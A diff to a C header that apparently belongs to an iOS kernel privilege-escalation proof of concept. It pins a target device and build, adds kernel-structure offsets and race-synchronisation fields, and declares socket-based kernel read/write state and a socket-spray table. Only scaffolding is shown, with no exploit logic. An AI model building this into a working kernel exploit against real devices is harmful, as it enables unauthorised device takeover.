@@ -11,23 +11,24 @@
 #include <sys/syslimits.h>
 #include <sys/uio.h>
 
-#define LOG(fmt, ...) fprintf(stderr, "[i] " fmt "\n", ##__VA_ARGS__)
-#define LOG_ERR(fmt, ...) fprintf(stderr, "[err] " fmt "\n", ##__VA_ARGS__)
+typedef void (*poc_log_handler_t)(const char* line);
 
-#define DEBUG 1  // TODO
+void poc_set_log_handler(poc_log_handler_t handler);
+void poc_log(const char* prefix, const char* format, ...) __attribute__((format(printf, 2, 3)));
+
+#define LOG(fmt, ...) poc_log("[i] ", fmt, ##__VA_ARGS__)
+#define LOG_ERR(fmt, ...) poc_log("[err] ", fmt, ##__VA_ARGS__)
+
 #ifdef DEBUG
-#define LOG_DEBUG(fmt, ...) fprintf(stderr, "[debug] " fmt "\n", ##__VA_ARGS__)
+#define LOG_DEBUG(fmt, ...) poc_log("[debug] ", fmt, ##__VA_ARGS__)
 #else
 #define LOG_DEBUG(fmt, ...)
 #endif
 
-#define TARGET_FILE_SIZE 0x8000  // 2 pages
-#define MAX_OPEN_FDS 10240       // bsd/sys/syslimits.h
 #define MAX_SOCKETS_COUNT 0x5800
-// change this if search mappings count is ever changed, since it's the only thing we mlock
-// this changes in A18 path but we don't support that yet
-#define MAX_LOCKED_SURFACES 8
-#define OS_VERSION_AT_LEAST(major, minor) (g_offsets.ios_major_version > (major) || (g_offsets.ios_major_version == (major) && g_offsets.ios_minor_version >= (minor)))
+#define TARGET_DEVICE "iPhone17,2"
+#define TARGET_VERSION "18.6.2"
+#define TARGET_BUILD "22G100"
 
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t* address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                           boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
@@ -42,6 +43,8 @@ typedef struct free_thread_shared {
     _Atomic uint64_t target_object_offset_sync;
     _Atomic uint64_t go_sync;
     _Atomic uint64_t race_sync;
+    _Atomic uint64_t stop_sync;
+    _Atomic uint64_t map_error;
 } free_thread_shared_t;
 
 typedef struct mlock_surfaces {
@@ -50,10 +53,12 @@ typedef struct mlock_surfaces {
 } mlock_surfaces_t;
 
 typedef struct offsets {
-    uint32_t ios_major_version;
-    uint32_t ios_minor_version;
     uint64_t inpcb_icmp6filt;
+    uint64_t inpcb_inp_list_le_next;
+    uint64_t inpcb_inp_pcbinfo;
     uint64_t inpcb_inp_socket;
+    uint64_t inpcbinfo_ipi_zone;
+    uint64_t zone_view_name;
     uint64_t socket_so_count;
     uint64_t socket_so_background_thread;
     uint64_t thread_t_ro;
@@ -97,30 +102,29 @@ typedef struct pe_context {
     struct iovec iov;
     uint64_t highiest_success_idx;
     uint64_t success_read_count;
+    uint64_t oob_race_max_tries;
+    bool race_failed;
 
     int control_socket;
     int rw_socket;
     uint64_t control_socket_pcb;
     uint64_t rw_socket_pcb;
-
-    uint8_t control_data[0x20];
-    // these 2 are only used in 1 func, but we keep them here to stay faithful to original
-    uint8_t early_kwrite64_write_buf[0x20];
-    uint8_t kwrite_length_buffer[0x20];
+    uint8_t rw_filter_snapshot[0x20];
+    bool filter_snapshots_valid;
+    bool transport_unsafe;
 
     uint8_t* default_file_content;
-    uint8_t* getsockopt_read_data;
 
-    bool is_a18_devices;
     uint64_t kernel_base;
     uint64_t kernel_slide;
 
-    mach_port_t socket_ports[MAX_SOCKETS_COUNT];    // save output mach port from fileport_makeport
-    uint64_t socket_pcb_ids[MAX_SOCKETS_COUNT];  // save pcb gencnt on this array
+    mach_port_t socket_ports[MAX_SOCKETS_COUNT];  // save output mach port from fileport_makeport
+    uint64_t socket_pcb_ids[MAX_SOCKETS_COUNT];   // save pcb gencnt on this array
     size_t socket_ports_count;
 
-    mlock_surfaces_t mlock_surfaces[MAX_LOCKED_SURFACES];
+    mlock_surfaces_t* mlock_surfaces;
     size_t mlock_surfaces_count;
+    size_t mlock_surfaces_capacity;
 } pe_context_t;
 extern pe_context_t g_ctx;
 
